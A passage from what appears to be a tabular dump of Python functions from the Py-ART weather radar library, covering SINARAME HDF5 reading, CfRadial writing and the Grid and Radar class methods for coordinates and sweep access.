        nbins = hfile['dataset1/data1/data'].shape[1]
        _range['data'] = np.linspace(0, max_range[0] * 1000.0, nbins, dtype='float32')
        _range['meters_to_center_of_first_gate'] = 0
        _range['meters_between_gates'] = max_range[0] * 1000.0 / nbins
    azimuth = filemetadata('azimuth')
    az_data = np.ones((total_rays,), dtype='float32')
    for (dset, start, stop) in zip(datasets, ssri, seri):
        if SINARAME_object == 'ELEV':
            sweep_az = hfile[dset]['where'].attrs['az_angle']
        elif SINARAME_object == 'AZIM':
            startaz = hfile[dset]['where'].attrs['startaz']
            stopaz = hfile[dset]['where'].attrs['stopaz']
            nrays = stop - start + 1
            sweep_az = np.linspace(startaz, stopaz, nrays, endpoint=True)
        elif 'startazA' in ds1_how and 'stopazA' in ds1_how:
            startaz = hfile[dset]['how'].attrs['startazA']
            stopaz = hfile[dset]['how'].attrs['stopazA']
            sweep_az = np.angle((np.exp(1j * np.deg2rad(startaz)) + np.exp(1j * np.deg2rad(stopaz))) / 2.0, deg=True)
        else:
            nrays = stop - start + 1
            sweep_az = np.linspace(0, 360, nrays, endpoint=False)
        az_data[start:stop + 1] = sweep_az
    azimuth['data'] = az_data
    _time = filemetadata('time')
    if 'startazT' in ds1_how and 'stopazT' in ds1_how:
        t_data = np.empty((total_rays,), dtype='float32')
        for (dset, start, stop) in zip(datasets, ssri, seri):
            t_start = hfile[dset]['how'].attrs['startazT']
            t_stop = hfile[dset]['how'].attrs['stopazT']
            t_data[start:stop + 1] = (t_start + t_stop) / 2
        start_epoch = t_data.min()
        start_time = datetime.utcfromtimestamp(start_epoch)
        _time['units'] = make_time_unit_str(start_time)
        _time['data'] = t_data - start_epoch
    else:
        t_data = np.empty((total_rays,), dtype='int32')
        for (dset, start, stop) in zip(datasets, ssri, seri):
            dset_what = hfile[dset]['what'].attrs
            start_str = _to_str(dset_what['startdate'] + dset_what['starttime'])
            end_str = _to_str(dset_what['enddate'] + dset_what['endtime'])
            start_dt = datetime.strptime(start_str, '%Y%m%d%H%M%S')
            end_dt = datetime.strptime(end_str, '%Y%m%d%H%M%S')
            time_delta = end_dt - start_dt
            delta_seconds = time_delta.seconds + time_delta.days * 3600 * 24
            rays = stop - start + 1
            sweep_start_epoch = (start_dt - datetime(1970, 1, 1)).total_seconds()
            t_data[start:stop + 1] = sweep_start_epoch + np.linspace(0, delta_seconds, rays)
        start_epoch = t_data.min()
        start_time = datetime.utcfromtimestamp(start_epoch)
        _time['units'] = make_time_unit_str(start_time)
        _time['data'] = (t_data - start_epoch).astype('float32')
    fields = {}
    h_field_keys = [k for k in hfile['dataset1'] if k.startswith('data')]
    SINARAME_fields = [hfile['dataset1'][d]['what'].attrs['quantity'] for d in h_field_keys]
    for (SINARAME_field, h_field_key) in zip(SINARAME_fields, h_field_keys):
        field_name = filemetadata.get_field_name(_to_str(SINARAME_field))
        if field_name is None:
            continue
        fdata = np.ma.zeros((total_rays, nbins), dtype='float32')
        start = 0
        for (dset, rays_in_sweep) in zip(datasets, rays_per_sweep):
            sweep_data = _get_SINARAME_h5_sweep_data(hfile[dset][h_field_key])
            sweep_nbins = sweep_data.shape[1]
            fdata[start:start + rays_in_sweep, :sweep_nbins] = sweep_data[:]
            start += rays_in_sweep
        field_dic = filemetadata(field_name)
        field_dic['data'] = fdata
        field_dic['_FillValue'] = get_fillvalue()
        fields[field_name] = field_dic
        if file_field_names:
            fields[field_name].update(filemetadata.get_metadata(field_names[field_name]))
    instrument_parameters = None
    return Radar(_time, _range, fields, metadata, scan_type, latitude, longitude, altitude, sweep_number, sweep_mode, fixed_angle, sweep_start_ray_index, sweep_end_ray_index, azimuth, elevation, instrument_parameters=instrument_parameters)"
ARM-DOE/pyart,write_sinarame_cfradial,"def write_sinarame_cfradial(path):
    """"""
    This function takes SINARAME_H5 files (where every file has only one field
    and one volume) from a folder and writes a CfRadial file for each volume
    including all fields.

    Parameters
    ----------
    path : str
        Where the SINARAME_H5 files are.

    """"""
    path_user = os.path.expanduser(path)
    TH_list = glob.glob(path_user + '/*_TH_*.H5')
    file_date = [i.split('_')[-1][9:-4] for i in TH_list]
    file_date.sort()
    for i in file_date:
        files = glob.glob(path_user + '/*' + i + 'Z.H5')
        files.sort(reverse=True)
        files.sort(key=lambda x: len(x.split('_')[-2]))
        for j in np.arange(len(files)):
            basename = os.path.basename(files[j])
            bs = basename.split('_')
            base1 = f'{bs[0]}_{bs[1]}_{bs[2]}_{bs[3]}_{bs[4]}'
            file = f'{path_user}/{base1}'
            if j == 0:
                try:
                    radar = read_sinarame_h5(file, file_field_names=True)
                    (azi_shape, range_shape) = radar.fields['TV']['data'].shape
                except ValueError:
                    print(""x - this Radar wasn't created"", base1, sep='\t')
                except KeyError:
                    print('x - Wrong BUFR conversion', base1, sep='\t')
            else:
                try:
                    radar_tmp = read_sinarame_h5(file, file_field_names=True)
                    field = radar_tmp.fields.keys()[0]
                    if radar_tmp.fields[field]['data'].shape[1] != range_shape:
                        n_missing_gates = range_shape - radar_tmp.fields[field]['data'].shape[1]
                        fill = np.ma.masked_all((azi_shape, n_missing_gates))
                        data = np.ma.concatenate([radar_tmp.fields[field]['data'], fill], 1)
                        radar_tmp.fields[field]['data'] = data
                    radar.fields.update(radar_tmp.fields)
                except KeyError:
                    print('x - Wrong BUFR conversion', base1, sep='\t')
                except ValueError:
                    print(""x - this Radar wasn't created"", base1, sep='\t')
                except NameError:
                    print(""Radar didn't exist, creating"")
                    radar = read_sinarame_h5(file, file_field_names=True)
        time1 = num2date(radar.time['data'][0], radar.time['units'], calendar='standard', only_use_cftime_datetimes=True, only_use_python_datetimes=False).strftime('%Y%m%d_%H%M%S')
        time2 = num2date(radar.time['data'][-1], radar.time['units'], calendar='standard', only_use_cftime_datetimes=True, only_use_python_datetimes=False).strftime('%Y%m%d_%H%M%S')
        radar._DeflateLevel = 5
        cffile = f'cfrad.{time1}.0000_to_{time2}.0000_{bs[0]}_{bs[1]}_{bs[2]}'
        print(f'Writing to {path_user}{cffile}.nc')
        write_cfradial(path_user + '/' + cffile + '.nc', radar, format='NETCDF4_CLASSIC')"
ARM-DOE/pyart,_to_str,"def _to_str(text):
    """"""Convert bytes to str if necessary.""""""
    if hasattr(text, 'decode'):
        return text.decode('utf-8')
    else:
        return text"
ARM-DOE/pyart,_get_SINARAME_h5_sweep_data,"def _get_SINARAME_h5_sweep_data(group):
    """"""Get SINARAME_H5 sweet data from an HDF5 group.""""""
    what = group['what']
    raw_data = group['data'][:]
    if 'nodata' in what.attrs:
        nodata = what.attrs.get('nodata')
        data = np.ma.masked_equal(raw_data, nodata)
    else:
        data = np.ma.masked_array(raw_data)
    if 'undetect' in what.attrs:
        undetect = what.attrs.get('undetect')
        data[data == undetect] = np.ma.masked
    offset = 0.0
    gain = 1.0
    if 'offset' in what.attrs:
        offset = what.attrs.get('offset')
    if 'gain' in what.attrs:
        gain = what.attrs.get('gain')
    return data * gain + offset"
ARM-DOE/pyart,texture_of_complex_phase,"def texture_of_complex_phase(radar, phidp_field=None, phidp_texture_field=None):
    """"""
    Calculate the texture of the differential phase field.

    Calculate the texture of the real part of the complex differential
    phase field

    Parameters
    ----------
    radar : Radar
        Radar object from which to .
    phidp_field : str, optional
        Name of field in radar which contains the differential phase shift.
        None will use the default field name in the Py-ART configuration file.
    phidp_texture_field : str, optional
        Name to use for the differential phase texture field metadata.
        None will use the default field name in the Py-ART configuration file.

    Returns
    -------
    texture_field : dict
        Field dictionary containing the texture of the real part
        of the complex differential phase.

    References
    ----------
    Gourley, J. J., P. Tabary, and J. Parent du Chatelet,
    A fuzzy logic algorithm for the separation of precipitating from
    nonprecipitating echoes using polarimetric radar observations,
    Journal of Atmospheric and Oceanic Technology 24 (8), 1439-1451

    """"""
    if not _WRADLIB_AVAILABLE:
        raise MissingOptionalDependency('wradlib is required to use texture_of_complex_phase but is ' + 'not installed')
    if phidp_field is None:
        phidp_field = get_field_name('differential_phase')
    if phidp_texture_field is None:
        phidp_texture_field = get_field_name('differential_phase')
    phidp = radar.fields[phidp_field]['data']
    complex_phase = np.exp(1j * (phidp * np.pi / 180.0))
    w_texture_complex = wradlib.dp.texture((np.real(complex_phase) + 1.0) * 180)
    texture_field = get_metadata(phidp_texture_field)
    texture_field['data'] = w_texture_complex
    texture_field['standard_name'] = 'texture_of_differential_phase_hv'
    texture_field['long_name'] = 'Texture of differential phase'
    return texture_field"
ARM-DOE/pyart,_point_data_factory,"def _point_data_factory(grid, coordinate):
    """"""Return a function which returns the locations of all points.""""""

    def _point_data():
        """"""The function which returns the locations of all points.""""""
        reg_x = grid.x['data']
        reg_y = grid.y['data']
        reg_z = grid.z['data']
        if coordinate == 'x':
            return np.tile(reg_x, (len(reg_z), len(reg_y), 1)).swapaxes(2, 2)
        elif coordinate == 'y':
            return np.tile(reg_y, (len(reg_z), len(reg_x), 1)).swapaxes(1, 2)
        else:
            assert coordinate == 'z'
            return np.tile(reg_z, (len(reg_x), len(reg_y), 1)).swapaxes(0, 2)
    return _point_data"
ARM-DOE/pyart,_point_lon_lat_data_factory,"def _point_lon_lat_data_factory(grid, coordinate):
    """"""Return a function which returns the geographic locations of points.""""""

    def _point_lon_lat_data():
        """"""The function which returns the geographic point locations.""""""
        x = grid.point_x['data']
        y = grid.point_y['data']
        projparams = grid.get_projparams()
        geographic_coords = cartesian_to_geographic(x, y, projparams)
        if coordinate == 0:
            grid.point_latitude['data'] = geographic_coords[1]
        else:
            grid.point_longitude['data'] = geographic_coords[0]
        return geographic_coords[coordinate]
    return _point_lon_lat_data"
ARM-DOE/pyart,_point_altitude_data_factory,"def _point_altitude_data_factory(grid):
    """"""Return a function which returns the point altitudes.""""""

    def _point_altitude_data():
        """"""The function which returns the point altitudes.""""""
        return grid.origin_altitude['data'][0] + grid.point_z['data']
    return _point_altitude_data"
ARM-DOE/pyart,__init__,"def __init__(self, time, fields, metadata, origin_latitude, origin_longitude, origin_altitude, x, y, z, projection=None, radar_latitude=None, radar_longitude=None, radar_altitude=None, radar_time=None, radar_name=None):
    """"""Initalize object.""""""
    self.time = time
    self.fields = fields
    self.metadata = metadata
    self.origin_latitude = origin_latitude
    self.origin_longitude = origin_longitude
    self.origin_altitude = origin_altitude
    self.x = x
    self.y = y
    self.z = z
    self.nx = len(x['data'])
    self.ny = len(y['data'])
    self.nz = len(z['data'])
    if projection is None:
        self.projection = {'proj': 'pyart_aeqd', '_include_lon_0_lat_0': True}
    else:
        self.projection = projection
    self.radar_latitude = radar_latitude
    self.radar_longitude = radar_longitude
    self.radar_altitude = radar_altitude
    self.radar_time = radar_time
    self.radar_name = radar_name
    self.nradar = self._find_and_check_nradar()
    self.init_point_x_y_z()
    self.init_point_longitude_latitude()
    self.init_point_altitude()
    return"
ARM-DOE/pyart,__getstate__,"def __getstate__(self):
    """"""Return object's state which can be pickled.""""""
    state = self.__dict__.copy()
    del state['point_x']
    del state['point_y']
    del state['point_z']
    del state['point_latitude']
    del state['point_longitude']
    del state['point_altitude']
    return state"
ARM-DOE/pyart,__setstate__,"def __setstate__(self, state):
    """"""Restore unpicklable entries from pickled object.""""""
    self.__dict__.update(state)
    self.init_point_x_y_z()
    self.init_point_longitude_latitude()
    self.init_point_altitude()"
ARM-DOE/pyart,projection_proj,"@property
def projection_proj(self):
    projparams = self.get_projparams()
    if projparams['proj'] == 'pyart_aeqd':
        raise ValueError('Proj instance can not be made for the pyart_aeqd projection')
    if not _PYPROJ_AVAILABLE:
        raise MissingOptionalDependency('PyProj is required to create a Proj instance but it ' + 'is not installed')
    proj = pyproj.Proj(projparams)
    return proj"
ARM-DOE/pyart,get_projparams,"def get_projparams(self):
    """"""Return a projparam dict from the projection attribute.""""""
    projparams = self.projection.copy()
    if projparams.pop('_include_lon_0_lat_0', False):
        projparams['lon_0'] = self.origin_longitude['data'][0]
        projparams['lat_0'] = self.origin_latitude['data'][0]
    return projparams"
ARM-DOE/pyart,_find_and_check_nradar,"def _find_and_check_nradar(self):
    """"""
        Return the number of radars which were used to create the grid.

        Examine the radar attributes to determine the number of radars which
        were used to create the grid. If the size of the radar attributes
        are inconsistent a ValueError is raised by this method.
        """"""
    nradar_set = False
    nradar = 0
    if self.radar_latitude is not None:
        nradar = len(self.radar_latitude['data'])
        nradar_set = True
    if self.radar_longitude is not None:
        if nradar_set and len(self.radar_longitude['data']) != nradar:
            raise ValueError('Inconsistent length of radar_ arguments.')
        nradar = len(self.radar_longitude['data'])
        nradar_set = True
    if self.radar_altitude is not None:
        if nradar_set and len(self.radar_altitude['data']) != nradar:
            raise ValueError('Inconsistent length of radar_ arguments.')
        nradar = len(self.radar_altitude['data'])
        nradar_set = True
    if self.radar_time is not None:
        if nradar_set and len(self.radar_time['data']) != nradar:
            raise ValueError('Inconsistent length of radar_ arguments.')
        nradar = len(self.radar_time['data'])
        nradar_set = True
    if self.radar_name is not None:
        if nradar_set and len(self.radar_name['data']) != nradar:
            raise ValueError('Inconsistent length of radar_ arguments.')
        nradar = len(self.radar_name['data'])
        nradar_set = True
    return nradar"
ARM-DOE/pyart,init_point_x_y_z,"def init_point_x_y_z(self):
    """"""Initialize or reset the point_{x, y, z} attributes.""""""
    self.point_x = LazyLoadDict(get_metadata('point_x'))
    self.point_x.set_lazy('data', _point_data_factory(self, 'x'))
    self.point_y = LazyLoadDict(get_metadata('point_y'))
    self.point_y.set_lazy('data', _point_data_factory(self, 'y'))
    self.point_z = LazyLoadDict(get_metadata('point_z'))
    self.point_z.set_lazy('data', _point_data_factory(self, 'z'))"
ARM-DOE/pyart,init_point_longitude_latitude,"def init_point_longitude_latitude(self):
    """"""
        Initialize or reset the point_{longitude, latitudes} attributes.
        """"""
    point_longitude = LazyLoadDict(get_metadata('point_longitude'))
    point_longitude.set_lazy('data', _point_lon_lat_data_factory(self, 0))
    self.point_longitude = point_longitude
    point_latitude = LazyLoadDict(get_metadata('point_latitude'))
    point_latitude.set_lazy('data', _point_lon_lat_data_factory(self, 1))
    self.point_latitude = point_latitude"
ARM-DOE/pyart,init_point_altitude,"def init_point_altitude(self):
    """"""Initialize the point_altitude attribute.""""""
    point_altitude = LazyLoadDict(get_metadata('point_altitude'))
    point_altitude.set_lazy('data', _point_altitude_data_factory(self))
    self.point_altitude = point_altitude"
ARM-DOE/pyart,write,"def write(self, filename, format='NETCDF4', arm_time_variables=False, arm_alt_lat_lon_variables=False):
    """"""
        Write the the Grid object to a NetCDF file.

        Parameters
        ----------
        filename : str
            Filename to save to.
        format : str, optional
            NetCDF format, one of 'NETCDF4', 'NETCDF4_CLASSIC',
            'NETCDF3_CLASSIC' or 'NETCDF3_64BIT'.
        arm_time_variables : bool, optional
            True to write the ARM standard time variables base_time and
            time_offset. False will not write these variables.
        arm_alt_lat_lon_variables : bool, optional
            True to write the ARM standard alt, lat, lon variables.
            False will not write these variables.

        """"""
    from ..io.grid_io import write_grid
    write_grid(filename, self, format=format, arm_time_variables=arm_time_variables, arm_alt_lat_lon_variables=arm_alt_lat_lon_variables)"
ARM-DOE/pyart,to_xarray,"def to_xarray(self):
    """"""
        Convert the Grid object to an xarray format.

        Attributes
        ----------
        time : dict
            Time of the grid.
        fields : dict of dicts
            Moments from radars or other variables.
        longitude, latitude : dict, 2D
            Arrays of latitude and longitude for the grid height level.
        x, y, z : dict, 1D
            Distance from the grid origin for each Cartesian coordinate axis
            in a one dimensional array.

        """"""
    if not _XARRAY_AVAILABLE:
        raise MissingOptionalDependency('Xarray is required to use Grid.to_xarray but is not ' + 'installed!')
    (lon, lat) = self.get_point_longitude_latitude()
    z = self.z['data']
    y = self.y['data']
    x = self.x['data']
    time = np.array([num2date(self.time['data'][0], self.time['units'])])
    ds = xarray.Dataset()
    for field in list(self.fields.keys()):
        field_data = self.fields[field]['data']
        data = xarray.DataArray(np.ma.expand_dims(field_data, 0), dims=('time', 'z', 'y', 'x'), coords={'time': (['time'], time), 'z': (['z'], z), 'lat': (['y', 'x'], lat), 'lon': (['y', 'x'], lon), 'y': (['y'], y), 'x': (['x'], x)})
        for meta in list(self.fields[field].keys()):
            if meta != 'data':
                data.attrs.update({meta: self.fields[field][meta]})
        ds[field] = data
        ds.lon.attrs = [('long_name', 'longitude of grid cell center'), ('units', 'degree_E'), ('standard_name', 'Longitude')]
        ds.lat.attrs = [('long_name', 'latitude of grid cell center'), ('units', 'degree_N'), ('standard_name', 'Latitude')]
        ds.z.attrs = get_metadata('z')
        ds.y.attrs = get_metadata('y')
        ds.x.attrs = get_metadata('x')
        ds.z.encoding['_FillValue'] = None
        ds.lat.encoding['_FillValue'] = None
        ds.lon.encoding['_FillValue'] = None
        ds.close()
    return ds"
ARM-DOE/pyart,add_field,"def add_field(self, field_name, field_dict, replace_existing=False):
    """"""
        Add a field to the object.

        Parameters
        ----------
        field_name : str
            Name of the field to the fields dictionary.
        field_dict : dict
            Dictionary containing field data and metadata.
        replace_existing : bool, optional
            True to replace the existing field with key field_name if it
            exists, overwriting the existing data. If False, a ValueError is
            raised if field_name already exists.

        """"""
    if 'data' not in field_dict:
        raise KeyError('Field dictionary must contain a ""data"" key')
    if field_name in self.fields and replace_existing is False:
        raise ValueError('A field named %s already exists' % field_name)
    if field_dict['data'].shape != (self.nz, self.ny, self.nx):
        raise ValueError('Field has invalid shape')
    self.fields[field_name] = field_dict"
ARM-DOE/pyart,get_point_longitude_latitude,"def get_point_longitude_latitude(self, level=0, edges=False):
    """"""
        Return arrays of longitude and latitude for a given grid height level.

        Parameters
        ----------
        level : int, optional
            Grid height level at which to determine latitudes and longitudes.
            This is not currently used as all height level have the same
            layout.
        edges : bool, optional
            True to calculate the latitude and longitudes of the edges by
            interpolating between Cartesian coordinates points and
            extrapolating at the boundaries. False to calculate the locations
            at the centers.

        Returns
        -------
        longitude, latitude : 2D array
            Arrays containing the latitude and longitudes, in degrees, of the
            grid points or edges between grid points for the given height.

        """"""
    x = self.x['data']
    y = self.y['data']
    projparams = self.get_projparams()
    return cartesian_vectors_to_geographic(x, y, projparams, edges=edges)"
ARM-DOE/pyart,_point_data,"def _point_data():
    """"""The function which returns the locations of all points.""""""
    reg_x = grid.x['data']
    reg_y = grid.y['data']
    reg_z = grid.z['data']
    if coordinate == 'x':
        return np.tile(reg_x, (len(reg_z), len(reg_y), 1)).swapaxes(2, 2)
    elif coordinate == 'y':
        return np.tile(reg_y, (len(reg_z), len(reg_x), 1)).swapaxes(1, 2)
    else:
        assert coordinate == 'z'
        return np.tile(reg_z, (len(reg_x), len(reg_y), 1)).swapaxes(0, 2)"
ARM-DOE/pyart,_point_lon_lat_data,"def _point_lon_lat_data():
    """"""The function which returns the geographic point locations.""""""
    x = grid.point_x['data']
    y = grid.point_y['data']
    projparams = grid.get_projparams()
    geographic_coords = cartesian_to_geographic(x, y, projparams)
    if coordinate == 0:
        grid.point_latitude['data'] = geographic_coords[1]
    else:
        grid.point_longitude['data'] = geographic_coords[0]
    return geographic_coords[coordinate]"
ARM-DOE/pyart,_point_altitude_data,"def _point_altitude_data():
    """"""The function which returns the point altitudes.""""""
    return grid.origin_altitude['data'][0] + grid.point_z['data']"
ARM-DOE/pyart,_rays_per_sweep_data_factory,"def _rays_per_sweep_data_factory(radar):
    """"""Return a function which returns the number of rays per sweep.""""""

    def _rays_per_sweep_data():
        """"""The function which returns the number of rays per sweep.""""""
        return radar.sweep_end_ray_index['data'] - radar.sweep_start_ray_index['data'] + 1
    return _rays_per_sweep_data"
ARM-DOE/pyart,_gate_data_factory,"def _gate_data_factory(radar, coordinate):
    """"""Return a function which returns the Cartesian locations of gates.""""""

    def _gate_data():
        """"""The function which returns the Cartesian locations of gates.""""""
        ranges = radar.range['data']
        azimuths = radar.azimuth['data']
        elevations = radar.elevation['data']
        cartesian_coords = antenna_vectors_to_cartesian(ranges, azimuths, elevations, edges=False)
        if coordinate != 0:
            radar.gate_x['data'] = cartesian_coords[0]
        if coordinate != 1:
            radar.gate_y['data'] = cartesian_coords[1]
        if coordinate != 2:
            radar.gate_z['data'] = cartesian_coords[2]
        return cartesian_coords[coordinate]
    return _gate_data"
ARM-DOE/pyart,_gate_lon_lat_data_factory,"def _gate_lon_lat_data_factory(radar, coordinate):
    """"""Return a function which returns the geographic locations of gates.""""""

    def _gate_lon_lat_data():
        """"""The function which returns the geographic locations gates.""""""
        x = radar.gate_x['data']
        y = radar.gate_y['data']
        projparams = radar.projection.copy()
        if projparams.pop('_include_lon_0_lat_0', False):
            projparams['lon_0'] = radar.longitude['data'][0]
            projparams['lat_0'] = radar.latitude['data'][0]
        geographic_coords = cartesian_to_geographic(x, y, projparams)
        if coordinate == 0:
            radar.gate_latitude['data'] = geographic_coords[1]
        else:
            radar.gate_longitude['data'] = geographic_coords[0]
        return geographic_coords[coordinate]
    return _gate_lon_lat_data"
ARM-DOE/pyart,_gate_altitude_data_factory,"def _gate_altitude_data_factory(radar):
    """"""Return a function which returns the gate altitudes.""""""

    def _gate_altitude_data():
        """"""The function which returns the gate altitudes.""""""
        try:
            return radar.altitude['data'] + radar.gate_z['data']
        except ValueError:
            return np.mean(radar.altitude['data']) + radar.gate_z['data']
    return _gate_altitude_data"
ARM-DOE/pyart,__init__,"def __init__(self, time, _range, fields, metadata, scan_type, latitude, longitude, altitude, sweep_number, sweep_mode, fixed_angle, sweep_start_ray_index, sweep_end_ray_index, azimuth, elevation, altitude_agl=None, target_scan_rate=None, rays_are_indexed=None, ray_angle_res=None, scan_rate=None, antenna_transition=None, instrument_parameters=None, radar_calibration=None, rotation=None, tilt=None, roll=None, drift=None, heading=None, pitch=None, georefs_applied=None):
    if 'calendar' not in time:
        time['calendar'] = 'gregorian'
    self.time = time
    self.range = _range
    self.fields = fields
    self.metadata = metadata
    self.scan_type = scan_type
    self.latitude = latitude
    self.longitude = longitude
    self.altitude = altitude
    self.altitude_agl = altitude_agl
    self.sweep_number = sweep_number
    self.sweep_mode = sweep_mode
    self.fixed_angle = fixed_angle
    self.sweep_start_ray_index = sweep_start_ray_index
    self.sweep_end_ray_index = sweep_end_ray_index
    self.target_scan_rate = target_scan_rate
    self.rays_are_indexed = rays_are_indexed
    self.ray_angle_res = ray_angle_res
    self.azimuth = azimuth
    self.elevation = elevation
    self.scan_rate = scan_rate
    self.antenna_transition = antenna_transition
    self.rotation = rotation
    self.tilt = tilt
    self.roll = roll
    self.drift = drift
    self.heading = heading
    self.pitch = pitch
    self.georefs_applied = georefs_applied
    self.instrument_parameters = instrument_parameters
    self.radar_calibration = radar_calibration
    self.ngates = len(_range['data'])
    self.nrays = len(time['data'])
    self.nsweeps = len(sweep_number['data'])
    self.projection = {'proj': 'pyart_aeqd', '_include_lon_0_lat_0': True}
    self.init_rays_per_sweep()
    self.init_gate_x_y_z()
    self.init_gate_longitude_latitude()
    self.init_gate_altitude()"
ARM-DOE/pyart,__getstate__,"def __getstate__(self):
    """"""Return object's state which can be pickled.""""""
    state = self.__dict__.copy()
    del state['rays_per_sweep']
    del state['gate_x']
    del state['gate_y']
    del state['gate_z']
    del state['gate_longitude']
    del state['gate_latitude']
    del state['gate_altitude']
    return state"
ARM-DOE/pyart,__setstate__,"def __setstate__(self, state):
    """"""Restore unpicklable entries from pickled object.""""""
    self.__dict__.update(state)
    self.init_rays_per_sweep()
    self.init_gate_x_y_z()
    self.init_gate_longitude_latitude()
    self.init_gate_altitude()"
ARM-DOE/pyart,init_rays_per_sweep,"def init_rays_per_sweep(self):
    """"""Initialize or reset the rays_per_sweep attribute.""""""
    lazydic = LazyLoadDict(get_metadata('rays_per_sweep'))
    lazydic.set_lazy('data', _rays_per_sweep_data_factory(self))
    self.rays_per_sweep = lazydic"
ARM-DOE/pyart,init_gate_x_y_z,"def init_gate_x_y_z(self):
    """"""Initialize or reset the gate_{x, y, z} attributes.""""""
    gate_x = LazyLoadDict(get_metadata('gate_x'))
    gate_x.set_lazy('data', _gate_data_factory(self, 0))
    self.gate_x = gate_x
    gate_y = LazyLoadDict(get_metadata('gate_y'))
    gate_y.set_lazy('data', _gate_data_factory(self, 1))
    self.gate_y = gate_y
    gate_z = LazyLoadDict(get_metadata('gate_z'))
    gate_z.set_lazy('data', _gate_data_factory(self, 2))
    self.gate_z = gate_z"
ARM-DOE/pyart,init_gate_longitude_latitude,"def init_gate_longitude_latitude(self):
    """"""
        Initialize or reset the gate_longitude and gate_latitude attributes.
        """"""
    gate_longitude = LazyLoadDict(get_metadata('gate_longitude'))
    gate_longitude.set_lazy('data', _gate_lon_lat_data_factory(self, 0))
    self.gate_longitude = gate_longitude
    gate_latitude = LazyLoadDict(get_metadata('gate_latitude'))
    gate_latitude.set_lazy('data', _gate_lon_lat_data_factory(self, 1))
    self.gate_latitude = gate_latitude"
ARM-DOE/pyart,init_gate_altitude,"def init_gate_altitude(self):
    """"""Initialize the gate_altitude attribute.""""""
    gate_altitude = LazyLoadDict(get_metadata('gate_altitude'))
    gate_altitude.set_lazy('data', _gate_altitude_data_factory(self))
    self.gate_altitude = gate_altitude"
ARM-DOE/pyart,_check_sweep_in_range,"def _check_sweep_in_range(self, sweep):
    """"""Check that a sweep number is in range.""""""
    if sweep < 0 or sweep >= self.nsweeps:
        raise IndexError('Sweep out of range: ', sweep)
    return"
ARM-DOE/pyart,check_field_exists,"def check_field_exists(self, field_name):
    """"""
        Check that a field exists in the fields dictionary.

        If the field does not exist raise a KeyError.

        Parameters
        ----------
        field_name : str
            Name of field to check.

        """"""
    if field_name not in self.fields:
        raise KeyError('Field not available: ' + field_name)
    return"
ARM-DOE/pyart,iter_start,"def iter_start(self):
    """"""Return an iterator over the sweep start indices.""""""
    return (s for s in self.sweep_start_ray_index['data'])"
ARM-DOE/pyart,iter_end,"def iter_end(self):
    """"""Return an iterator over the sweep end indices.""""""
    return (s for s in self.sweep_end_ray_index['data'])"
ARM-DOE/pyart,iter_start_end,"def iter_start_end(self):
    """"""Return an iterator over the sweep start and end indices.""""""
    return ((s, e) for (s, e) in zip(self.iter_start(), self.iter_end()))"
ARM-DOE/pyart,iter_slice,"def iter_slice(self):
    """"""Return an iterator which returns sweep slice objects.""""""
    return (slice(s, e + 1) for (s, e) in self.iter_start_end())"
ARM-DOE/pyart,iter_field,"def iter_field(self, field_name):
    """"""Return an iterator which returns sweep field data.""""""
    self.check_field_exists(field_name)
    return (self.fields[field_name]['data'][s] for s in self.iter_slice())"
ARM-DOE/pyart,iter_azimuth,"def iter_azimuth(self):
    """"""Return an iterator which returns sweep azimuth data.""""""
    return (self.azimuth['data'][s] for s in self.iter_slice())"
ARM-DOE/pyart,iter_elevation,"def iter_elevation(self):
    """"""Return an iterator which returns sweep elevation data.""""""
    return (self.elevation['data'][s] for s in self.iter_slice())"
ARM-DOE/pyart,get_start,"def get_start(self, sweep):
    """"""Return the starting ray index for a given sweep.""""""
    self._check_sweep_in_range(sweep)
    return self.sweep_start_ray_index['data'][sweep]"
ARM-DOE/pyart,get_end,"def get_end(self, sweep):
    """"""Return the ending ray for a given sweep.""""""
    self._check_sweep_in_range(sweep)
    return self.sweep_end_ray_index['data'][sweep]"
ARM-DOE/pyart,get_start_end,"def get_start_end(self, sweep):
    """"""Return the starting and ending ray for a given sweep.""""""
    return (self.get_start(sweep), self.get_end(sweep))"
ARM-DOE/pyart,get_slice,"def get_slice(self, sweep):
    """"""Return a slice for selecting rays for a given sweep.""""""
    (start, end) = self.get_start_end(sweep)
    return slice(start, end + 1)"
ARM-DOE/pyart,get_field,"def get_field(self, sweep, field_name, copy=False):
    """"""
        Return the field data for a given sweep.

        When used with :py:func:`get_gate_x_y_z` this method can be used to
        obtain the data needed for plotting a radar field with the correct
        spatial context.

        Parameters
        ----------
        sweep : int
            Sweep number to retrieve data for, 0 based.
        field_name : str
            Name of the field from which data should be retrieved.
        copy : bool, optional
            True to return a copy of the data. False, the default, returns
            a view of the data (when possible), changing this data will
            change the data in the underlying Radar object.

        Returns
        -------
        data : array
            Array containing data for the requested sweep and field.

        """"""
    self.check_field_exists(field_name)
    s = self.get_slice(sweep)
    data = self.fields[field_name]['data'][s]
    if copy:
        return data.copy()
    else:
        return data"
ARM-DOE/pyart,get_azimuth,"def get_azimuth(self, sweep, copy=False):
    """"""
        Return an array of azimuth angles for a given sweep.

        Parameters
        ----------
        sweep : int
            Sweep number to retrieve data for, 0 based.
        copy : bool, optional
            True to return a copy of the azimuths. False, the default, returns
            a view of the azimuths (when possible), changing this data will
            change the data in the underlying Radar object.

        Returns
        -------
        azimuths : array
            Array containing the azimuth angles for a given sweep.

        """"""
    s = self.get_slice(sweep)
    azimuths = self.azimuth['data'][s]
    if copy:
        return azimuths.copy()
    else:
        return azimuths"
ARM-DOE/pyart,get_elevation,"def get_elevation(self, sweep, copy=False):
    """"""
        Return an array of elevation angles for a given sweep.

        Parameters
        ----------
        sweep : int
            Sweep number to retrieve data for, 0 based.
        copy : bool, optional
            True to return a copy of the elevations. False, the default,
            returns a view of the elevations (when possible), changing this
            data will change the data in the underlying Radar object.

        Returns
        -------
        elevation : array
            Array containing the elevation angles for a given sweep.

        """"""
    s = self.get_slice(sweep)
    elevation = self.elevation['data'][s]
    if copy:
        return elevation.copy()
    else:
        return elevation"
ARM-DOE/pyart,get_gate_x_y_z,"def get_gate_x_y_z(self, sweep, edges=False, filter_transitions=False):
    """"""
        Return the x, y and z gate locations in meters for a given sweep.

        With the default parameter this method returns the same data as
        contained in the gate_x, gate_y and gate_z attributes but this method
        performs the gate location calculations only for the specified sweep
        and therefore is more efficient than accessing this data through these
        attribute.

        When used with :py:func:`get_field` this method can be used to obtain
        the data needed for plotting a radar field with the correct spatial
        context.

        Parameters
        ----------
        sweep : int
            Sweep number to retrieve gate locations from, 0 based.
        edges : bool, optional
            True to return the locations of the gate edges calculated by
            interpolating between the range, azimuths and elevations.
            False (the default) will return the locations of the gate centers
            with no interpolation.
